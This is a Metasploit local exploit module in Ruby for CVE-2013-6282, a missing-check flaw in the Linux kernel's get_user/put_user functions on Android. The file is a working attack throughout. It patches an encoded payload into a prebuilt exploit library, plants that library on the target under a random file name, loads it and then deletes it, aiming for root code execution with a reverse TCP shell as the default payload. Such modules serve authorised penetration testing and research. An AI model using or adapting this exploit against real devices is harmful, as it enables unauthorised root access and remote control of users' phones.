# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        &#039;Name&#039;           => "Android get_user/put_user Exploit",
        &#039;Description&#039;    => %q{
            This module exploits a missing check in the get_user and put_user API functions
            in the linux kernel before 3.5.5. The missing checks on these functions
            allow an unprivileged user to read and write kernel memory.
                This exploit first reads the kernel memory to identify the commit_creds and
            ptmx_fops address, then uses the write primitive to execute shellcode as uid 0.
            The exploit was first discovered in the wild in the vroot rooting application.
        },
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         => [
          &#039;fi01&#039;,        # libget_user_exploit / libput_user_exploit
          &#039;cubeundcube&#039;, # kallsyms_in_memory
          &#039;timwr&#039;,       # Metasploit module
        ],
        &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-6282&#039; ],
          [ &#039;URL&#039;, &#039;http://forum.xda-developers.com/showthread.php?t=2434453&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/fi01/libget_user_exploit&#039; ],
          [ &#039;URL&#039;, &#039;http://forum.xda-developers.com/showthread.php?t=2565758&#039; ],
        ],
        &#039;DisclosureDate&#039; => "Sep 06 2013",
        "Platform"       => [ "android", "linux" ],
        &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
        &#039;Payload&#039;        => { &#039;Space&#039;    => 2048, },
        &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039;     => 120,
          &#039;PAYLOAD&#039;      => &#039;linux/armle/mettle/reverse_tcp&#039;,
        },
        &#039;DefaultTarget&#039; => 0,
      }
    ))
  end

  def exploit
    local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2013-6282.so" )
    exploit_data = File.read(local_file, {:mode => &#039;rb&#039;})

    space = payload_space
    payload_encoded = payload.encoded

    # Substitute the exploit shellcode with our own
    exploit_data.gsub!("\x90" * 4 + "\x00" * (space - 4), payload_encoded + "\x90" * (payload_encoded.length - space))

    workingdir = session.fs.dir.getwd
    remote_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    write_file(remote_file, exploit_data)

    print_status("Loading exploit library #{remote_file}")
    session.core.load_library(
        &#039;LibraryFilePath&#039; => local_file,
        &#039;TargetFilePath&#039;  => remote_file,
        &#039;UploadLibrary&#039;   => false,
        &#039;Extension&#039;       => false,
        &#039;SaveToDisk&#039;      => false
    )
    print_status("Loaded library #{remote_file}, deleting")
    session.fs.file.rm(remote_file)
    print_status("Waiting #{datastore[&#039;WfsDelay&#039;]} seconds for payload")
  end

end

